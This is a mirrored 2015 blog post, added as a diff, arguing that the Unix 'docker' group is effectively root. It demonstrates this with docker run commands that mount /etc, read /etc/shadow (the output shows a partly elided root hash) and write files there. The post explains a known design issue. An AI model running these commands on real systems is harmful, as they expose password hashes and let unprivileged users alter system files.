@@ -1,0 +1,312 @@
+
+    <html lang="en">
+  
+<!-- Mirrored from blog.zopyx.com/andreas-jung/contents/on-docker-security-docker-group-considered-harmful by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 21 Sep 2020 14:14:29 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<base  />
+
+    <meta charset="utf-8">
+    <title> On Docker security: 'docker' group considered harmful - Andreas Jung </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="The company for Zope, Plone, Python, MongoDB and Electronic Publishing">
+    <meta name="author" content="ZOPYX, Andreas Jung, Tuebingen, Germany">
+
+    <link href="on-docker-security-docker-group-considered-harmful/assets/css/bootstrap.css" rel="stylesheet">
+
+    <style>
+      body {
+        padding-top: 100px; /* 60px to make the container go all the way to the bottom of the topbar */
+      }
+    </style>
+    <link rel="stylesheet" href="https://blog.zopyx.com/assets/css/font-awesome.css">
+
+    <!-- fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Droid+Sans:400,700" rel="stylesheet" type="text/css">
+    <link href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet/less" type="text/css" href="https://blog.zopyx.com/assets/less/bootstrap.less" />
+    <script type="text/javascript" src="https://blog.zopyx.com/assets/js/less-1.3.1.min.js"></script>
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+    <!--[if lt IE 9]>
+      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+      <![endif]-->
+    <!-- Le fav and touch icons -->
+    <link rel="shortcut icon" href="on-docker-security-docker-group-considered-harmful/assets/ico/favicon.ico">
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" src="https://blog.zopyx.com/assets/ico/apple-touch-icon-144-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" sizes="114x114" src="https://blog.zopyx.com/assets/ico/apple-touch-icon-114-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" sizes="72x72" src="https://blog.zopyx.com/assets/ico/apple-touch-icon-72-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" src="https://blog.zopyx.com/assets/ico/apple-touch-icon-57-precomposed.png">
+
+    <link rel="stylesheet" href="https://blog.zopyx.com/assets/css/base.css">
+    <link rel="stylesheet" href="https://blog.zopyx.com/bxslider/jquery.bxslider.css">
+
+
+    <!-- Plone compatibility -->
+    
+    
+  </head>
+
+  <body data-spy="scroll" data-target=".sidebar-nav" class="section-andreas-jung context-on-docker-security-docker-group-considered-harmful portal-type-news-item">
+
+    <div class="navbar navbar-inverse navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          
+            
+            <a class="brand" style="color: white" href="../contents.html">
+              <h1>Blog of Andreas Jung</h1>
+            </a>
+          
+          
+          
+          
+           <form id="global-nav-search" class="navbar-search pull-right" action="https://blog.zopyx.com/andreas-jung/search">
+            
+            <input type="text" class="search-query" placeholder="Search" name="SearchableText" />
+           </form>
+        </div>
+      </div>
+    </div>
+     <!-- /keyvisual -->
+    <article>
+      <section>
+
+        <!-- main -->
+        <div class="container container-main">
+            
+            <div class="row-fluid">
+                <div></div>
+            </div>
+            <div class="row-fluid">
+                <div class="span8">
+                    
+                    <div id="content">
+                      
+
+                        
+                            
+    <span class="label">Feb 05, 2015</span>
+
+                            
+                                
+                                
+            
+                <h1 id="parent-fieldname-title" class="documentFirstHeading">
+                    On Docker security: 'docker' group considered harmful
+                </h1>
+            
+            
+        
+                            
+
+                            
+                                 
+                            
+
+                            <div id="content-core">
+                                
+    
+
+        
+        <div class="newsImageContainer">
+            <a href="on-docker-security-docker-group-considered-harmful/image/image_view_fullscreen.html" id="parent-fieldname-image">
+               <img src="on-docker-security-docker-group-considered-harmful/image_mini.png" alt="On Docker security: 'docker' group considered harmful" title="" height="178" width="200" class="newsImage" />
+            </a>
+            
+        </div>
+
+        
+
+        <div id="parent-fieldname-text" class="plain">
+            <p>If you are member of the UNIX 'docker' must be considered harmful. Being member of the 'docker' group is not unusual because it gives you the right to build and execute containers as normal user but it also gives you full root access rights which I consider as a major security issue and a broken-by-design feature.</p>
+
+<p>By default I can not access /etc/shadow because it is only readable by root or group wheel:</p>
+
+<p style="margin-left:40px"><tt><code>ajung@demo:~$ who am i<br />
+ajung &nbsp; &nbsp;pts/2 &nbsp; &nbsp; &nbsp; &nbsp;Feb &nbsp;5 07:03&nbsp;</code></tt></p>
+
+<p style="margin-left:40px"><tt><code>ajung@demo:~$ groups<br />
+ajung docker</code></tt></p>
+
+<p style="margin-left:40px"><br />
+<tt><code>ajung@demo:~$ ls -la /etc/shadow<br />
+-rw-r----- 1 root shadow 897 Jan 25 10:05 /etc/shadow</code></tt></p>
+
+<p style="margin-left:40px"><br />
+<tt><code>ajung@demo:~$ cat /etc/shadow<br />
+cat: /etc/shadow: Permission denied</code></tt></p>
+
+<p><span style="font-size:12.8000011444092px">Now I create a simple Docker image that exposes /data as mount point for a volume</span></p>
+
+<p style="margin-left:40px"><code>FROM phusion/baseimage<br />
+VOLUME /data</code></p>
+
+<p>Now I can start the container and attach any local filesystem to the container and access it with full root rights.</p>
+
+<p>In this case I can easily access the content of the formerly protected /etc/shadow file</p>
+
+<p style="margin-left:40px"><code>ajung@demo:~$ docker run -v /etc:/data zopyx/test cat /data/shadow<br />
+root:$6$rnW9d.................awVOOsWtCb41DY01:16457:0:99999:7:::<br />
+daemon:*:16457:0:99999:7:::<br />
+bin:*:16457:0:99999:7:::<br />
+sys:*:16457:0:99999:7:::<br />
+sync:*:16457:0:99999:7:::<br />
+games:*:16457:0:99999:7:::</code></p>
+
+<p>I can also create content on a root filesystem as standard user&nbsp;</p>
+
+<p style="margin-left:40px"><code>ajung@demo:~$ docker run -v /etc:/data zopyx/test touch /data/hello-world.txt<br />
+ajung@demo:~$ ls -la /etc/hello-world.txt<br />
+-rw-r--r-- 1 root root 0 Feb &nbsp;5 07:36 /etc/hello-world.txt</code></p>
+
+<p>The whole Docker security concept (is there a security concept?) appears completely broken.</p>
+
+<p>So user accounts belonging to the UNIX group 'docker' are fully exploitable. Standard UNIX users can gain elevated rights on the local machine if they belong to the 'docker' group and can perhaps exploit other machines as well by tampering SSH keys etc....many attack vectors are possible.</p>
+
+<h2>Update (2015-02-05, 16:00 UTC)</h2>
+
+<p>The discovered behavior is in fact intentional and documented in the <a href="https://docs.docker.com/articles/security/#docker-daemon-attack-surface">Docker security documentation</a>. The first sentence is already completely broken.</p>
+
+<p style="text-align:center"><strong>"Only trusted users should be allowed to control your Docker daemon"</strong></p>
+
+<p>Building a&nbsp;secure IT system on human trust is fundamentally broken. A secure system must be build on the best technology practices. A human is always a weak factor when it comes to security.</p>
+
+<p>Another point: the default security policy (if there is one?) is: everything is allowed, you are root, dropping the priviledges as needed is up to you. Complete improper approach. A secure system must be as closed as possible by default and give the container only the rights and capabilities that it really needs.&nbsp;</p>
+
+<p>And yet another point: as standard user it is by design not possible to gain root permissions (except using sudo). The problem once again arises from the 'docker' group being practically root. An attacker might get hold of my SSH keys and login into a dockerized box. With the described attach vector an intruder has an easy game getting through Docker. The preassumption <strong>"Only trusted users should be allowed to control your Docker daemon"&nbsp;</strong>&nbsp;is therefore just wrong and the security concept of Docker is broken.</p>
+
+<p>Docker leaves security to the user and administrators instead of providing a secure way for building secure containers for deployment. Instead Docker should be better compared to a rootkit generator.</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+        </div>
+
+
+         
+    
+
+                            </div>
+                        
+
+                      
+                    </div>
+                  
+                </div>
+                <!-- right slot -->
+                <div class="span4">
+                    <div></div>
+                    
+                        
+                    
+                    <div></div>
+                </div>
+          </div>
+        </div>
+
+        <!-- main front-page -->
+        
+      <div class="footer-push"></div>
+    
+      </section>
+    </article>
+    <!-- ----------------------------------- /Footer -->
+    
+
+<!-- Matomo -->
+<script type="text/javascript">
+  var _paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="http://matomo.zopyx.com/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '8']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<!-- End Matomo Code -->
+
+
+    <script type="text/javascript" src="on-docker-security-docker-group-considered-harmful/assets/js/jquery.js"></script>
+    <script type="text/javascript" src="on-docker-security-docker-group-considered-harmful/assets/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://blog.zopyx.com/jquerytools/jquery.tools.min.js"></script>
+    <script type="text/javascript" src="https://blog.zopyx.com/readmore/jquery.readmore.min.js"></script>
+    <script type="text/javascript" src="https://blog.zopyx.com/isotope/jquery.isotope.js"></script>
+    <script type="text/javascript" src="https://blog.zopyx.com/hyphenator/hyphenate.js"></script>
+    <script type="text/javascript" src="https://blog.zopyx.com/cycle/jquery.cycle.js"></script>
+    <script type="text/javascript" src="https://blog.zopyx.com/bxslider/jquery.bxslider.min.js"></script>
+
+
+    <script type="text/javascript">
+        $('.carousel').carousel({interval: 6000});
+        $('.readmore').readmore({substr_len: 250});
+        $('input[type="submit"]').addClass('btn btn-success');
+        $('input[type="reset"]').addClass('btn btn-danger');
+        if ($('body').width() > 640) {
+            $('.image-cycle').cycle({fx: 'fadeZoom', speed: 1000, timeout: 5000});
+            $('.bxslider').bxSlider({randomStart: true,speed: 1000, pause:4000, auto: true});
+            $('.bxslider1').bxSlider({randomStart: true,speed: 1000, pause:4000, auto: true});
+            $('.bxslider-pp').bxSlider({randomStart: false, mode: 'fade', speed: 1000, pause:7000, auto: true, infiniteLoop: true, controls: false});
+        }  
+        /*
+        Hyphenator.config({
+            displaytogglebox : true,
+            minwordlength : 4,
+            defaultlanguage: 'de',
+            classname: 'content'
+        });
+        Hyphenator.run();
+        */
+
+        // Resize iframe.fluid (Slideshare, YouTube integration)
+        $(function() {
+            var $slides= $('iframe.fluid');
+            $slides.each(function() {
+                $(this)
+                    .data('aspectRatio', this.height / this.width)
+                    .removeAttr('height')
+                    .removeAttr('width');
+            });
+            // When the window is resized
+            // (You'll probably want to debounce this)
+            $(window).resize(function() {
+
+                $fluidEl = $(".media-item");
+                var newWidth = $fluidEl.width() *0.9;
+                
+                // Resize all videos according to their own aspect ratio
+                $slides.each(function() {
+
+                    var $el = $(this);
+                    $el.width(newWidth)
+                       .height(newWidth * $el.data('aspectRatio'));
+
+                });
+            // Kick off one resize to fix all videos on page load
+            }).resize();
+        });
+
+    </script>
+
+    <!-- Jira feedback collector -->
+    
+    
+
+
+  </body>
+
+<!-- Mirrored from blog.zopyx.com/andreas-jung/contents/on-docker-security-docker-group-considered-harmful by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 21 Sep 2020 14:14:33 GMT -->
+</html>
+
+
